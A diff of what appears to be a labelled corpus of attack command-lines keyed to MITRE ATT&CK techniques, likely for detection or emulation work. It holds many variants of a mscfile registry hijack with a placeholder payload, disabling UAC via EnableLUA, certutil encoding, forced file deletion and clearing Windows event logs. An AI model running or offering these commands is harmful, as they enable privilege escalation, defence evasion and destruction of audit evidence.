+T1072 cmd /c choco install -y winscp
+T1072 powershell -c choco install -y winscp
 T1072 choco install -f winscp
-T1072 cmd /c "choco install -f winscp"
-T1072 powershell -c "choco install -f winscp"
+T1072 cmd /c choco install -f winscp
+T1072 powershell -c choco install -f winscp
 
 # T1547 Boot or Logon Autostart Execution
 T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-T1547 cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-T1547 powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
 T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-T1547 cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-T1547 powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
 T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-T1547 cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
-T1547 powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
 T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-T1547 cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ 
-T1547 powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ 
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
 T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-T1547 cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-T1547 powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
 T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-T1547 cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-T1547 powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
 T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-T1547 cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-T1547 powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
 T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-T1547 cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-T1547 powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
 T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-T1547 cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-T1547 powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
 T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-T1547 cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-T1547 powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
 T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-T1547 cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-T1547 powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
 T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-T1547 cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-T1547 powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
 T1547 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-T1547 cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-T1547 powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+T1547 cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+T1547 powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 T1547 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-T1547 cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-T1547 powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+T1547 cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+T1547 powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-T1547 cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-T1547 powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
 T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-T1547 cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-T1547 powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
 T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-T1547 cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-T1547 powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
 T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-T1547 cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-T1547 powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
 T1547 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-T1547 cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-T1547 powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
+T1547 cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+T1547 powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
 T1547 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-T1547 cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-T1547 powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
+T1547 cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+T1547 powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
 T1547 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-T1547 cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
-T1547 powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+T1547 cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+T1547 powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
 T1547 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-T1547 cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
-T1547 powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+T1547 cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+T1547 powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
 T1547 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
-T1547 cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
-T1547 powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+T1547 cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+T1547 powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
 T1547 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
-T1547 cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
-T1547 powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+T1547 cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+T1547 powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
 
 # T1027 Obfuscated Files or Information
 T1027 certutil -encode ${source_file_path} ${destination_file_path}
-T1027 cmd /c "certutil -encode ${source_file_path} ${destination_file_path}"
-T1027 powershell -c "certutil -encode ${source_file_path} ${destination_file_path}"
+T1027 cmd /c certutil -encode ${source_file_path} ${destination_file_path}
+T1027 powershell -c certutil -encode ${source_file_path} ${destination_file_path}
 T1027 certutil -encode -f ${source_file_path} ${destination_file_path}
-T1027 cmd /c "certutil -encode -f ${source_file_path} ${destination_file_path}"
-T1027 powershell -c "certutil -encode -f ${source_file_path} ${destination_file_path}"
+T1027 cmd /c certutil -encode -f ${source_file_path} ${destination_file_path}
+T1027 powershell -c certutil -encode -f ${source_file_path} ${destination_file_path}
 T1027 certutil -encode -Unicode -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -Unicode -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -Unicode -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -Unicode -f error.txt encode.txt
+T1027 powershell -c certutil -encode -Unicode -f error.txt encode.txt
 T1027 certutil -encode -Unicode error.txt encode.txt
-T1027 cmd /c "certutil -encode -Unicode error.txt encode.txt"
-T1027 powershell -c "certutil -encode -Unicode error.txt encode.txt"
+T1027 cmd /c certutil -encode -Unicode error.txt encode.txt
+T1027 powershell -c certutil -encode -Unicode error.txt encode.txt
 T1027 certutil -encode -UnicodeText -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -UnicodeText -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -UnicodeText -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -UnicodeText -f error.txt encode.txt
+T1027 powershell -c certutil -encode -UnicodeText -f error.txt encode.txt
 T1027 certutil -encode -UnicodeText error.txt encode.txt
-T1027 cmd /c "certutil -encode -UnicodeText error.txt encode.txt"
-T1027 powershell -c "certutil -encode -UnicodeText error.txt encode.txt"
+T1027 cmd /c certutil -encode -UnicodeText error.txt encode.txt
+T1027 powershell -c certutil -encode -UnicodeText error.txt encode.txt
 T1027 certutil -encode -v error.txt encode.txt
-T1027 cmd /c "certutil -encode -v error.txt encode.txt"
-T1027 powershell -c "certutil -encode -v error.txt encode.txt"
+T1027 cmd /c certutil -encode -v error.txt encode.txt
+T1027 powershell -c certutil -encode -v error.txt encode.txt
 T1027 certutil -encode -v -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -v -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -v -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -v -f error.txt encode.txt
+T1027 powershell -c certutil -encode -v -f error.txt encode.txt
 T1027 certutil -encode -Unicode -v -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -Unicode -v -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -Unicode -v -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -Unicode -v -f error.txt encode.txt
+T1027 powershell -c certutil -encode -Unicode -v -f error.txt encode.txt
 T1027 certutil -encode -Unicode -v error.txt encode.txt
-T1027 cmd /c "certutil -encode -Unicode -v error.txt encode.txt"
-T1027 powershell -c "certutil -encode -Unicode -v error.txt encode.txt"
+T1027 cmd /c certutil -encode -Unicode -v error.txt encode.txt
+T1027 powershell -c certutil -encode -Unicode -v error.txt encode.txt
 T1027 certutil -encode -UnicodeText -v -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -UnicodeText -v -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -UnicodeText -v -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -UnicodeText -v -f error.txt encode.txt
+T1027 powershell -c certutil -encode -UnicodeText -v -f error.txt encode.txt
 T1027 certutil -encode -UnicodeText -v error.txt encode.txt
-T1027 cmd /c "certutil -encode -UnicodeText -v error.txt encode.txt"
-T1027 powershell -c "certutil -encode -UnicodeText -v error.txt encode.txt"
+T1027 cmd /c certutil -encode -UnicodeText -v error.txt encode.txt
+T1027 powershell -c certutil -encode -UnicodeText -v error.txt encode.txt
 T1027 certutil -encode -gmt ${source_file_path} ${destination_file_path}
-T1027 cmd /c "certutil -encode -gmt ${source_file_path} ${destination_file_path}"
-T1027 powershell -c "certutil -encode -gmt ${source_file_path} ${destination_file_path}"
+T1027 cmd /c certutil -encode -gmt ${source_file_path} ${destination_file_path}
+T1027 powershell -c certutil -encode -gmt ${source_file_path} ${destination_file_path}
 T1027 certutil -encode -gmt -f ${source_file_path} ${destination_file_path}
-T1027 cmd /c "certutil -encode -gmt -f ${source_file_path} ${destination_file_path}"
-T1027 powershell -c "certutil -encode -gmt -f ${source_file_path} ${destination_file_path}"
+T1027 cmd /c certutil -encode -gmt -f ${source_file_path} ${destination_file_path}
+T1027 powershell -c certutil -encode -gmt -f ${source_file_path} ${destination_file_path}
 T1027 certutil -encode -Unicode -gmt -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -Unicode -gmt -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -Unicode -gmt -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -Unicode -gmt -f error.txt encode.txt
+T1027 powershell -c certutil -encode -Unicode -gmt -f error.txt encode.txt
 T1027 certutil -encode -Unicode -gmt error.txt encode.txt
-T1027 cmd /c "certutil -encode -Unicode -gmt error.txt encode.txt"
-T1027 powershell -c "certutil -encode -Unicode -gmt error.txt encode.txt"
+T1027 cmd /c certutil -encode -Unicode -gmt error.txt encode.txt
+T1027 powershell -c certutil -encode -Unicode -gmt error.txt encode.txt
 T1027 certutil -encode -UnicodeText -gmt -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -UnicodeText -gmt -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -UnicodeText -gmt -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -UnicodeText -gmt -f error.txt encode.txt
+T1027 powershell -c certutil -encode -UnicodeText -gmt -f error.txt encode.txt
 T1027 certutil -encode -UnicodeText -gmt error.txt encode.txt
-T1027 cmd /c "certutil -encode -UnicodeText -gmt error.txt encode.txt"
-T1027 powershell -c "certutil -encode -UnicodeText -gmt error.txt encode.txt"
+T1027 cmd /c certutil -encode -UnicodeText -gmt error.txt encode.txt
+T1027 powershell -c certutil -encode -UnicodeText -gmt error.txt encode.txt
 T1027 certutil -encode -gmt -v error.txt encode.txt
-T1027 cmd /c "certutil -encode -gmt -v error.txt encode.txt"
-T1027 powershell -c "certutil -encode -gmt -v error.txt encode.txt"
+T1027 cmd /c certutil -encode -gmt -v error.txt encode.txt
+T1027 powershell -c certutil -encode -gmt -v error.txt encode.txt
 T1027 certutil -encode -gmt -v -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -gmt -v -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -gmt -v -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -gmt -v -f error.txt encode.txt
+T1027 powershell -c certutil -encode -gmt -v -f error.txt encode.txt
 T1027 certutil -encode -Unicode -gmt -v -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -Unicode -gmt -v -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -Unicode -gmt -v -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -Unicode -gmt -v -f error.txt encode.txt
+T1027 powershell -c certutil -encode -Unicode -gmt -v -f error.txt encode.txt
 T1027 certutil -encode -Unicode -gmt -v error.txt encode.txt
-T1027 cmd /c "certutil -encode -Unicode -gmt -v error.txt encode.txt"
-T1027 powershell -c "certutil -encode -Unicode -gmt -v error.txt encode.txt"
+T1027 cmd /c certutil -encode -Unicode -gmt -v error.txt encode.txt
+T1027 powershell -c certutil -encode -Unicode -gmt -v error.txt encode.txt
 T1027 certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt
-T1027 cmd /c "certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt"
-T1027 powershell -c "certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt"
+T1027 cmd /c certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt
+T1027 powershell -c certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt
 T1027 certutil -encode -UnicodeText -gmt -v error.txt encode.txt
-T1027 cmd /c "certutil -encode -UnicodeText -gmt -v error.txt encode.txt"
-T1027 powershell -c "certutil -encode -UnicodeText -gmt -v error.txt encode.txt"
+T1027 cmd /c certutil -encode -UnicodeText -gmt -v error.txt encode.txt
+T1027 powershell -c certutil -encode -UnicodeText -gmt -v error.txt encode.txt
 
 # T1070 Indicator Removal
 T1070 rm -f ${local_file_path}
@@ -464,147 +464,147 @@ T1070 rm -r ${local_file_path} 2> /dev/null
 T1070 rm -r ${local_file_path} 2> &1
 T1070 rm -r ${local_file_path} 2> error.log
 T1070 del ${local_file_path}
-T1070 cmd /c "del ${local_file_path}"
-T1070 powershell -c "del ${local_file_path}"
+T1070 cmd /c del ${local_file_path}
+T1070 powershell -c del ${local_file_path}
 T1070 del /f ${local_file_path}
-T1070 cmd /c "del /f ${local_file_path}"
-T1070 powershell -c "del /f ${local_file_path}"
+T1070 cmd /c del /f ${local_file_path}
+T1070 powershell -c del /f ${local_file_path}
 T1070 del /p ${local_file_path}
-T1070 cmd /c "del /p ${local_file_path}"
-T1070 powershell -c "del /p ${local_file_path}"
+T1070 cmd /c del /p ${local_file_path}
+T1070 powershell -c del /p ${local_file_path}
 T1070 del /q ${local_file_path}
-T1070 cmd /c "del /q ${local_file_path}"
-T1070 powershell -c "del /q ${local_file_path}"
+T1070 cmd /c del /q ${local_file_path}
+T1070 powershell -c del /q ${local_file_path}
 T1070 del /f /q ${local_file_path}
-T1070 cmd /c "del /f /q ${local_file_path}"
-T1070 powershell -c "del /f /q ${local_file_path}"
+T1070 cmd /c del /f /q ${local_file_path}
+T1070 powershell -c del /f /q ${local_file_path}
 T1070 del /q /f ${local_file_path}
-T1070 cmd /c "del /q /f ${local_file_path}"
-T1070 powershell -c "del /q /f ${local_file_path}"
+T1070 cmd /c del /q /f ${local_file_path}
+T1070 powershell -c del /q /f ${local_file_path}
 T1070 del /p /q ${local_file_path}
-T1070 cmd /c "del /p /q ${local_file_path}"
-T1070 powershell -c "del /p /q ${local_file_path}"
+T1070 cmd /c del /p /q ${local_file_path}
+T1070 powershell -c del /p /q ${local_file_path}
 T1070 del /q /p ${local_file_path}
-T1070 cmd /c "del /q /p ${local_file_path}"
-T1070 powershell -c "del /q /p ${local_file_path}"
+T1070 cmd /c del /q /p ${local_file_path}
+T1070 powershell -c del /q /p ${local_file_path}
 T1070 del /f /p ${local_file_path}
-T1070 cmd /c "del /f /p ${local_file_path}"
-T1070 powershell -c "del /f /p ${local_file_path}"
+T1070 cmd /c del /f /p ${local_file_path}
+T1070 powershell -c del /f /p ${local_file_path}
 T1070 rmdir /s ${local_file_path}
-T1070 cmd /c "rmdir /s ${local_file_path}"
-T1070 powershell -c "rmdir /s ${local_file_path}"
+T1070 cmd /c rmdir /s ${local_file_path}
+T1070 powershell -c rmdir /s ${local_file_path}
 T1070 rmdir /s /q ${local_file_path}
-T1070 cmd /c "rmdir /s /q ${local_file_path}"
-T1070 powershell -c "rmdir /s /q ${local_file_path}"
+T1070 cmd /c rmdir /s /q ${local_file_path}
+T1070 powershell -c rmdir /s /q ${local_file_path}
 T1070 rmdir /q /s ${local_file_path}
-T1070 cmd /c "rmdir /q /s ${local_file_path}"
-T1070 powershell -c "rmdir /q /s ${local_file_path}"
+T1070 cmd /c rmdir /q /s ${local_file_path}
+T1070 powershell -c rmdir /q /s ${local_file_path}
 T1070 wevtutil cl system
-T1070 cmd /c "wevtutil cl system"
-T1070 powershell -c "wevtutil cl system"
+T1070 cmd /c wevtutil cl system
+T1070 powershell -c wevtutil cl system
 T1070 wevtutil cl application
-T1070 cmd /c "wevtutil cl application"
-T1070 powershell -c "wevtutil cl application"
+T1070 cmd /c wevtutil cl application
+T1070 powershell -c wevtutil cl application
 T1070 wevtutil cl security
-T1070 cmd /c "wevtutil cl security"
-T1070 powershell -c "wevtutil cl security"
+T1070 cmd /c wevtutil cl security
+T1070 powershell -c wevtutil cl security
 T1070 wevtutil.exe cl system
-T1070 cmd /c "wevtutil.exe cl system"
-T1070 powershell -c "wevtutil.exe cl system"
+T1070 cmd /c wevtutil.exe cl system
+T1070 powershell -c wevtutil.exe cl system
 T1070 wevtutil.exe cl application
-T1070 cmd /c "wevtutil.exe cl application"
-T1070 powershell -c "wevtutil.exe cl application"
+T1070 cmd /c wevtutil.exe cl application
+T1070 powershell -c wevtutil.exe cl application
 T1070 wevtutil.exe cl security
-T1070 cmd /c "wevtutil.exe cl security"
-T1070 powershell -c "wevtutil.exe cl security"
+T1070 cmd /c wevtutil.exe cl security
+T1070 powershell -c wevtutil.exe cl security
 T1070 wevtutil clear-log system
-T1070 cmd /c "wevtutil clear-log system"
-T1070 powershell -c "wevtutil clear-log system"
+T1070 cmd /c wevtutil clear-log system
+T1070 powershell -c wevtutil clear-log system
 T1070 wevtutil clear-log application
-T1070 cmd /c "wevtutil clear-log application"
-T1070 powershell -c "wevtutil clear-log application"
+T1070 cmd /c wevtutil clear-log application
+T1070 powershell -c wevtutil clear-log application
 T1070 wevtutil clear-log security
-T1070 cmd /c "wevtutil clear-log security"
-T1070 powershell -c "wevtutil clear-log security"
+T1070 cmd /c wevtutil clear-log security
